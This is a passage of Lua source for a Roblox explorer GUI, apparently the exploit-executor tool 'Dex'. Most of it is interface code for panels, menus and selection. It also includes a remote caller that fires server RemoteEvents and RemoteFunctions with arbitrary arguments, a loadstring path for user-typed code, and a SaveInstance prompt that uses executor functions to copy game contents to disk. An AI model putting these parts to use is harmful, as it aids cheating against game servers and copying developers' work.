	Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
	Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
	Parent = explorerPanel;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = GUI_SIZE
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-GUI_SIZE);
	Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
	Visible = false;
	Parent = explorerPanel;
})

local headerFrame = Create('Frame',{
	Name = "Header";
	BackgroundColor3 = GuiColor.Background;
	BorderColor3 = GuiColor.Border;
	Position = UDim2.new(0,0,0,0);
	Size = UDim2.new(1,0,0,HEADER_SIZE);
	Parent = explorerPanel;
	Create('TextLabel',{
		Text = "Explorer";
		BackgroundTransparency = 1;
		TextColor3 = GuiColor.Text;
		TextXAlignment = 'Left';
		Font = FONT;
		FontSize = FONT_SIZE;
		Position = UDim2.new(0,4,0,0);
		Size = UDim2.new(1,-4,0.5,0);
	});
})

local explorerFilter = 	Create('TextBox',{
	Text = "Filter Workspace";
	BackgroundTransparency = 0.8;
	TextColor3 = GuiColor.Text;
	TextXAlignment = 'Left';
	Font = FONT;
	FontSize = FONT_SIZE;
	Position = UDim2.new(0,4,0.5,0);
	Size = UDim2.new(1,-8,0.5,-2);
});
explorerFilter.Parent = headerFrame

SetZIndexOnChanged(explorerPanel)

local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

local Styles = {
	Font = Enum.Font.Arial;
	Margin = 5;
	Black = CreateColor3(0,0,0);
	White = CreateColor3(255,255,255);
}

local DropDown = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextColor = CreateColor3(0,0,0);
	TextColorOver = Styles.White;
	TextXAlignment = Enum.TextXAlignment.Left;
	Height = 20;
	BackColor = Styles.White;
	BackColorOver = CreateColor3(86,125,188);
	BorderColor = CreateColor3(216,216,216);
	BorderSizePixel = 2;
	ArrowColor = CreateColor3(160,160,160);
	ArrowColorOver = Styles.Black;
}

local Row = {
	Font = Styles.Font;
	FontSize = Enum.FontSize.Size14;
	TextXAlignment = Enum.TextXAlignment.Left;
	TextColor = Styles.Black;
	TextColorOver = Styles.White;
	TextLockedColor = CreateColor3(120,120,120);
	Height = 24;
	BorderColor = CreateColor3(216,216,216);
	BackgroundColor = Styles.White;
	BackgroundColorAlternate = CreateColor3(246,246,246);
	BackgroundColorMouseover = CreateColor3(211,224,244);
	TitleMarginLeft = 15;
}

local currentRightClickMenu
local CurrentInsertObjectWindow
local CurrentFunctionCallerWindow

local RbxApi

function ClassCanCreate(IName)
	local success,err = pcall(function() Instance.new(IName) end)
	if err then
		return false
	else
		return true
	end
end

function GetClasses()
	if RbxApi == nil then return {} end
	local classTable = {}
	for i,v in pairs(RbxApi.Classes) do
		if ClassCanCreate(v.Name) then
			table.insert(classTable,v.Name)
		end
	end
	return classTable
end

local function sortAlphabetic(t, property)
	table.sort(t, 
		function(x,y) return x[property] < y[property]
	end)
end

local function FunctionIsHidden(functionData)
	local tags = functionData["tags"]
	for _,name in pairs(tags) do
		if name == "deprecated"
			or name == "hidden"
			or name == "writeonly" then
			return true
		end
	end
	return false
end

local function GetAllFunctions(className)
	local class = RbxApi.Classes[className]
	local functions = {}
	
	if not class then return functions end
	
	while class do
		if class.Name == "Instance" then break end
		for _,nextFunction in pairs(class.Functions) do
			if not FunctionIsHidden(nextFunction) then
				table.insert(functions, nextFunction)
			end
		end
		class = RbxApi.Classes[class.Superclass]
	end
	
	sortAlphabetic(functions, "Name")

	return functions
end

function GetFunctions()
	if RbxApi == nil then return {} end
	local List = SelectionVar():Get()
	
	if #List == 0 then return end
	
	local MyObject = List[1]
	
	local functionTable = {}
	for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
		table.insert(functionTable,v)
	end
	return functionTable
end

function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a < b end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,200,1,0)
		menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end,1)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()
	local totalSize = explorerPanel.Parent.AbsoluteSize.y
	if #choices == 0 then return end
	
	table.sort(choices, function(a,b) return a.Name < b.Name end)

	local frame = Instance.new("Frame")	
	frame.Name = "InsertObject"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			--frame:Destroy()
			CurrentInsertObjectWindow.Visible = false
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("ScrollingFrame")
		menu.Size = UDim2.new(0,300,1,0)
		menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 0)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.TopImage = "rbxasset://textures/blackBkg_square.png"
		menu.MidImage = "rbxasset://textures/blackBkg_square.png"
		menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
		
		local function GetParameters(functionData)
			local paraString = ""
			paraString = paraString.."("
			for i,v in pairs(functionData.Arguments) do
				paraString = paraString..v.Type.." "..v.Name
				if i < #functionData.Arguments then
					paraString = paraString..", "
				end
			end
			paraString = paraString..")"
			return paraString
		end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
				choice(name)
			end,2)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function CreateInsertObject()
	if not CurrentInsertObjectWindow then return end
	CurrentInsertObjectWindow.Visible = true
	if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
	end
	if CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Parent = explorerPanel.Parent
	end
end

function CreateFunctionCaller()
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow:Destroy()
		CurrentFunctionCallerWindow = nil
	end
	CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
		GetFunctions(),
		"",
		false,
		function(option)
			CurrentFunctionCallerWindow:Destroy()
			CurrentFunctionCallerWindow = nil
			local list = SelectionVar():Get()
			for i = 1,#list do
				pcall(function() Instance.new(option,list[i]) end)
			end
			print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
			--CallFunction()
			DestroyRightClick()
		end
	)
	if currentRightClickMenu and CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
	end
	if CurrentFunctionCallerWindow then
		CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
	end
end

function CreateRightClickMenuItem(text, onClick, insObj)
	local button = Instance.new("TextButton")
	button.Font = DropDown.Font
	button.FontSize = DropDown.FontSize
	button.TextColor3 = DropDown.TextColor
	button.TextXAlignment = DropDown.TextXAlignment
	button.BackgroundColor3 = DropDown.BackColor
	button.AutoButtonColor = false
	button.BorderSizePixel = 0
	button.Active = true
	button.Text = text
	
	if insObj == 1 then
		local newIcon = Icon(nil,ExplorerIndex[text] or 0)
		newIcon.Position = UDim2.new(0,0,0,2)
		newIcon.Size = UDim2.new(0,16,0,16)
		newIcon.IconMap.ZIndex = 5
		newIcon.Parent = button
		button.Text = "\t\t"..button.Text
	elseif insObj == 2 then
		button.FontSize = Enum.FontSize.Size11
	end
	
	button.MouseEnter:connect(function()
		button.TextColor3 = DropDown.TextColorOver
		button.BackgroundColor3 = DropDown.BackColorOver
		if not insObj and CurrentInsertObjectWindow then
			if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
				CreateInsertObject()
			elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
				CurrentInsertObjectWindow.Visible = false
			end
		end
		if not insObj then
			if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			elseif button.Text == "Call Function" then
				CreateFunctionCaller()
			end
		end
	end)
	button.MouseLeave:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
	end)
	button.MouseButton1Click:connect(function()
		button.TextColor3 = DropDown.TextColor
		button.BackgroundColor3 = DropDown.BackColor
		onClick(text)
	end)	
	return button
end

function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
	local mouse = game.Players.LocalPlayer:GetMouse()

	local frame = Instance.new("Frame")	
	frame.Name = "DropDown"
	frame.Size = UDim2.new(0, 200, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Active = true
	
	local menu = nil
	local arrow = nil
	local expanded = false
	local margin = DropDown.BorderSizePixel;
	
	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]
	
	local function hideMenu()
		expanded = false
		--showArrow(DropDown.ArrowColor)
		if frame then 
			frame:Destroy()
			DestroyRightClick()
		end
	end
	
	local function showMenu()
		expanded = true
		menu = Instance.new("Frame")
		menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
		menu.Position = UDim2.new(0, margin, 0, 5)
		menu.BackgroundTransparency = 0
		menu.BackgroundColor3 = DropDown.BackColor
		menu.BorderColor3 = DropDown.BorderColor
		menu.BorderSizePixel = DropDown.BorderSizePixel
		menu.Active = true
		menu.ZIndex = 5
		menu.Parent = frame
		
		--local parentFrameHeight = script.Parent.List.Size.Y.Offset
		--local rowHeight = mouse.Y
		--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
		--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
		--end
			
		local function choice(name)
			onClick(name)
			hideMenu()
		end
		
		for i,name in pairs(choices) do
			local option = CreateRightClickMenuItem(name, function()
				choice(name)
			end)
			option.Size = UDim2.new(1, 0, 0, 20)
			option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
			option.ZIndex = menu.ZIndex
			option.Parent = menu
		end
	end


	showMenu()

	
	return frame
end

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

local clipboard = {}
local function delete(o)
	o.Parent = nil
end

local getTextWidth do
	local text = Create('TextLabel',{
		Name = "TextWidth";
		TextXAlignment = 'Left';
		TextYAlignment = 'Center';
		Font = FONT;
		FontSize = FONT_SIZE;
		Text = "";
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,1,0);
		Visible = false;
		Parent = explorerPanel;
	})
	function getTextWidth(s)
		text.Text = s
		return text.TextBounds.x
	end
end

local nameScanned = false
-- Holds the game tree converted to a list.
local TreeList = {}
-- Matches objects to their tree node representation.
local NodeLookup = {}

local nodeWidth = 0

local QuickButtons = {}

function filteringWorkspace()
	if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
		return true
	end
	return false
end

function lookForAName(obj,name)
	for i,v in pairs(obj:GetChildren()) do
		if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
		lookForAName(v,name)
	end
end

function scanName(obj)
	nameScanned = false
	if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
		nameScanned = true
	else
		lookForAName(obj,explorerFilter.Text)
	end
	return nameScanned
end

function updateActions()
	for i,v in pairs(QuickButtons) do
		if v.Cond() then
			v.Toggle(true)
		else
			v.Toggle(false)
		end
	end
end

local updateList,rawUpdateList,updateScroll,rawUpdateSize do
	local function r(t)
		for i = 1,#t do
			if not filteringWorkspace() or scanName(t[i].Object) then
				TreeList[#TreeList+1] = t[i]

				local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
				if w > nodeWidth then
					nodeWidth = w
				end
				if t[i].Expanded or filteringWorkspace() then
					r(t[i])
				end
			end
		end
	end

	function rawUpdateSize()
		scrollBarH.TotalSpace = nodeWidth
		scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
		scrollBarH:Update()
		local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
		scrollBarH.GUI.Visible = visible

		listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

		scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
		scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)
		
		scrollBar.TotalSpace = #TreeList+1
		scrollBar:Update()
	end

	function rawUpdateList()
		-- Clear then repopulate the entire list. It appears to be fast enough.
		TreeList = {}
		nodeWidth = 0
		r(NodeLookup[workspace.Parent])
		if DexStorageEnabled then
			r(NodeLookup[DexStorage])
		end
		if NilStorageEnabled then
			r(NodeLookup[NilStorage])
		end
		rawUpdateSize()
		updateActions()
	end

	-- Adding or removing large models will cause many updates to occur. We
	-- can reduce the number of updates by creating a delay, then dropping any
	-- updates that occur during the delay.
	local updatingList = false
	function updateList()
		if updatingList then return end
		updatingList = true
		wait(0.25)
		updatingList = false
		rawUpdateList()
	end

	local updatingScroll = false
	function updateScroll()
		if updatingScroll then return end
		updatingScroll = true
		wait(0.25)
		updatingScroll = false
		scrollBar:Update()
	end
end

local Selection do
	local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
	if not bindGetSelection then
		bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
		bindGetSelection.Parent = explorerPanel
	end

	local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
	if not bindSetSelection then
		bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
		bindSetSelection.Parent = explorerPanel
	end

	local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
	if not bindSelectionChanged then
		bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
		bindSelectionChanged.Parent = explorerPanel
	end

	local SelectionList = {}
	local SelectionSet = {}
	local Updates = true
	Selection = {
		Selected = SelectionSet;
		List = SelectionList;
	}

	local function addObject(object)
		-- list update
		local lupdate = false
		-- scroll update
		local supdate = false

		if not SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				table.insert(SelectionList,object)
				SelectionSet[object] = true
				node.Selected = true

				-- expand all ancestors so that selected node becomes visible
				node = node.Parent
				while node do
					if not node.Expanded then
						node.Expanded = true
						lupdate = true
					end
					node = node.Parent
				end
				supdate = true
			end
		end
		return lupdate,supdate
	end

	function Selection:Set(objects)
		local lupdate = false
		local supdate = false

		if #SelectionList > 0 then
			for i = 1,#SelectionList do
				local object = SelectionList[i]
				local node = NodeLookup[object]
				if node then
					node.Selected = false
					SelectionSet[object] = nil
				end
			end

			SelectionList = {}
			Selection.List = SelectionList
			supdate = true
		end

		for i = 1,#objects do
			local l,s = addObject(objects[i])
			lupdate = l or lupdate
			supdate = s or supdate
		end

		if lupdate then
			rawUpdateList()
			supdate = true
		elseif supdate then
			scrollBar:Update()
		end

		if supdate then
			bindSelectionChanged:Fire()
			updateActions()
		end
	end

	function Selection:Add(object)
		local l,s = addObject(object)
		if l then
			rawUpdateList()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		elseif s then
			scrollBar:Update()
			if Updates then
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end
	
	function Selection:StopUpdates()
		Updates = false
	end
	
	function Selection:ResumeUpdates()
		Updates = true
		bindSelectionChanged:Fire()
		updateActions()
	end

	function Selection:Remove(object,noupdate)
		if SelectionSet[object] then
			local node = NodeLookup[object]
			if node then
				node.Selected = false
				SelectionSet[object] = nil
				for i = 1,#SelectionList do
					if SelectionList[i] == object then
						table.remove(SelectionList,i)
						break
					end
				end

				if not noupdate then
					scrollBar:Update()
				end
				bindSelectionChanged:Fire()
				updateActions()
			end
		end
	end

	function Selection:Get()
		local list = {}
		for i = 1,#SelectionList do
			list[i] = SelectionList[i]
		end
		return list
	end

	bindSetSelection.OnInvoke = function(...)
		Selection:Set(...)
	end

	bindGetSelection.OnInvoke = function()
		return Selection:Get()
	end
end

function CreateCaution(title,msg)
	local newCaution = CautionWindow:Clone()
	newCaution.Title.Text = title
	newCaution.MainWindow.Desc.Text = msg
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

function CreateTableCaution(title,msg)
	if type(msg) ~= "table" then return CreateCaution(title,tostring(msg)) end
	local newCaution = TableCautionWindow:Clone()
	newCaution.Title.Text = title
	
	local TableList = newCaution.MainWindow.TableResults
	local TableTemplate = newCaution.MainWindow.TableTemplate
	
	for i,v in pairs(msg) do
		local newResult = TableTemplate:Clone()
		newResult.Type.Text = type(v)
		newResult.Value.Text = tostring(v)
		newResult.Position = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Parent = TableList
		TableList.CanvasSize = UDim2.new(0,0,0,#TableList:GetChildren() * 20)
		newResult.Visible = true
	end
	newCaution.Parent = explorerPanel.Parent
	newCaution.Visible = true
	newCaution.MainWindow.Ok.MouseButton1Up:connect(function()
		newCaution:Destroy()
	end)
end

local function Split(str, delimiter)
	local start = 1
	local t = {}
	while true do
		local pos = string.find (str, delimiter, start, true)
		if not pos then
			break
		end
		table.insert (t, string.sub (str, start, pos - 1))
		start = pos + string.len (delimiter)
	end
	table.insert (t, string.sub (str, start))
	return t
end

local function ToValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Number" then
		return tonumber(value)
	elseif type == "String" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif type == "Script" then
		local success,err = ypcall(function()
		_G.D_E_X_DONOTUSETHISPLEASE = nil
		loadstring(
			"_G.D_E_X_DONOTUSETHISPLEASE = "..value
		)()
		return _G.D_E_X_DONOTUSETHISPLEASE
		end)
		if err then
			return nil
		end
	else
		return nil
	end
end

local function ToPropValue(value,type)
	if type == "Vector2" then
		local list = Split(value,",")
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return Vector2.new(x,y)
	elseif type == "Vector3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		local z = tonumber(list[3]) or 0
		return Vector3.new(x,y,z)
	elseif type == "Color3" then
		local list = Split(value,",")
		if #list < 3 then return nil end
		local r = tonumber(list[1]) or 0
		local g = tonumber(list[2]) or 0
		local b = tonumber(list[3]) or 0
		return Color3.new(r/255,g/255, b/255)
	elseif type == "UDim2" then
		local list = Split(string.gsub(string.gsub(value, "{", ""),"}",""),",")
		if #list < 4 then return nil end
		local xScale = tonumber(list[1]) or 0
		local xOffset = tonumber(list[2]) or 0
		local yScale = tonumber(list[3]) or 0
		local yOffset = tonumber(list[4]) or 0
		return UDim2.new(xScale, xOffset, yScale, yOffset)
	elseif type == "Content" then
		return value
	elseif type == "float" or type == "int" or type == "double" then
		return tonumber(value)
	elseif type == "string" then
		return value
	elseif type == "NumberRange" then
		local list = Split(value,",")
		if #list == 1 then
			if tonumber(list[1]) == nil then return nil end
			local newVal = tonumber(list[1]) or 0
			return NumberRange.new(newVal)
		end
		if #list < 2 then return nil end
		local x = tonumber(list[1]) or 0
		local y = tonumber(list[2]) or 0
		return NumberRange.new(x,y)
	elseif string.sub(value,1,4) == "Enum" then
		local getEnum = value
		while true do
			local x,y = string.find(getEnum,".")
			if y then
				getEnum = string.sub(getEnum,y+1)
			else
				break
			end
		end
		print(getEnum)
		return getEnum
	else
		return nil
	end
end

function PromptRemoteCaller(inst)
	if CurrentRemoteWindow then
		CurrentRemoteWindow:Destroy()
		CurrentRemoteWindow = nil
	end
	CurrentRemoteWindow = RemoteWindow:Clone()
	CurrentRemoteWindow.Parent = explorerPanel.Parent
	CurrentRemoteWindow.Visible = true
	
	local displayValues = false
	
	local ArgumentList = CurrentRemoteWindow.MainWindow.Arguments
	local ArgumentTemplate = CurrentRemoteWindow.MainWindow.ArgumentTemplate
	
	if inst:IsA("RemoteEvent") then
		CurrentRemoteWindow.Title.Text = "Fire Event"
		CurrentRemoteWindow.MainWindow.Ok.Text = "Fire"
		CurrentRemoteWindow.MainWindow.DisplayReturned.Visible = false
		CurrentRemoteWindow.MainWindow.Desc2.Visible = false
	end
	
	local newArgument = ArgumentTemplate:Clone()
	newArgument.Parent = ArgumentList
	newArgument.Visible = true
	newArgument.Type.MouseButton1Down:connect(function()
		createDDown(newArgument.Type,function(choice)
			newArgument.Type.Text = choice
		end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
	end)
	
	CurrentRemoteWindow.MainWindow.Ok.MouseButton1Up:connect(function()
		if CurrentRemoteWindow and inst.Parent ~= nil then
			local MyArguments = {}
			for i,v in pairs(ArgumentList:GetChildren()) do
				table.insert(MyArguments,ToValue(v.Value.Text,v.Type.Text))
			end
			if inst:IsA("RemoteFunction") then
				if displayValues then
					spawn(function()
						local myResults = inst:InvokeServer(unpack(MyArguments))
						if myResults then
							CreateTableCaution("Remote Caller",myResults)
						else
							CreateCaution("Remote Caller","This remote did not return anything.")
						end
					end)
				else
					spawn(function()
						inst:InvokeServer(unpack(MyArguments))
					end)
				end
			else
				inst:FireServer(unpack(MyArguments))
			end
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Add.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			local newArgument = ArgumentTemplate:Clone()
			newArgument.Position = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Parent = ArgumentList
			ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			newArgument.Visible = true
			newArgument.Type.MouseButton1Down:connect(function()
				createDDown(newArgument.Type,function(choice)
					newArgument.Type.Text = choice
				end,"Script","Number","String","Color3","Vector3","Vector2","UDim2","NumberRange")
			end)
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Subtract.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			if #ArgumentList:GetChildren() > 1 then
				ArgumentList:GetChildren()[#ArgumentList:GetChildren()]:Destroy()
				ArgumentList.CanvasSize = UDim2.new(0,0,0,#ArgumentList:GetChildren() * 20)
			end
		end
	end)
	
	CurrentRemoteWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentRemoteWindow then
			CurrentRemoteWindow:Destroy()
			CurrentRemoteWindow = nil
		end
	end)
	
	CurrentRemoteWindow.MainWindow.DisplayReturned.MouseButton1Up:connect(function()
		if displayValues then
			displayValues = false
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = false
		else
			displayValues = true
			CurrentRemoteWindow.MainWindow.DisplayReturned.enabled.Visible = true
		end
	end)
end

function PromptSaveInstance(inst)
	if not SaveInstance and not _G.SaveInstance then CreateCaution("SaveInstance Missing","You do not have the SaveInstance function installed. Please go to RaspberryPi's thread to retrieve it.") return end
	if CurrentSaveInstanceWindow then
		CurrentSaveInstanceWindow:Destroy()
		CurrentSaveInstanceWindow = nil
		if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
			explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
		end
	end
	CurrentSaveInstanceWindow = SaveInstanceWindow:Clone()
	CurrentSaveInstanceWindow.Parent = explorerPanel.Parent
	CurrentSaveInstanceWindow.Visible = true
	
	local filename = CurrentSaveInstanceWindow.MainWindow.FileName
	local saveObjects = true
	local overwriteCaution = false
	
	CurrentSaveInstanceWindow.MainWindow.Save.MouseButton1Up:connect(function()
		if readfile and getelysianpath then
			if readfile(getelysianpath()..filename.Text..".rbxmx") then
				if not overwriteCaution then
					overwriteCaution = true
					local newCaution = ConfirmationWindow:Clone()
					newCaution.Name = "SaveInstanceOverwriteCaution"
					newCaution.MainWindow.Desc.Text = "The file, "..filename.Text..".rbxmx, already exists. Overwrite?"
					newCaution.Parent = explorerPanel.Parent
					newCaution.Visible = true
					newCaution.MainWindow.Yes.MouseButton1Up:connect(function()
						ypcall(function()
							SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
						end)
						overwriteCaution = false
						newCaution:Destroy()
						if CurrentSaveInstanceWindow then
							CurrentSaveInstanceWindow:Destroy()
							CurrentSaveInstanceWindow = nil
						end
					end)
					newCaution.MainWindow.No.MouseButton1Up:connect(function()
						overwriteCaution = false
						newCaution:Destroy()
					end)
				end
			else
				ypcall(function()
